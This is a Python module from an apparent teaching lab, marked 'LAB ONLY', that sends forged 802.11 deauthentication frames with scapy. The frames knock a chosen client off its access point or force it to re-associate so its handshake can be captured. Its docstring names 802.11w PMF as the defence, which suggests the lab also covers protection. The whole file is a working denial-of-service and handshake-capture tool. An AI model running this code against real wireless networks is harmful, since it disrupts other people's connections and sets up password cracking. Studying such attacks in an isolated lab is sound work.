# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Chris <goabonga@pm.me>

"""Attack side of netlab-wifi-deauth: 802.11 deauthentication flood. LAB ONLY.

Injects forged deauth frames (reason 7) to drop a client, or to force it to
re-associate and replay its handshake. Requires a monitor-mode NIC with
injection; not replayable in the netns lab. 802.11w PMF (see pmf.py) defeats it.
"""

from __future__ import annotations

import argparse

from netlab_core import verdict
from netlab_core.sniffing import load_scapy


def run(args: argparse.Namespace) -> int:
    s = load_scapy()
    frame = (
        s.RadioTap()
        / s.Dot11(addr1=args.client, addr2=args.bssid, addr3=args.bssid)
        / s.Dot11Deauth(reason=7)
    )
    print(f"[*] deauthing {args.client} from {args.bssid} on {args.iface}")
    s.sendp(frame, iface=args.iface, count=args.count, inter=args.interval, verbose=0)
    verdict("ALERT", f"sent {args.count} deauth frames")
    return 0
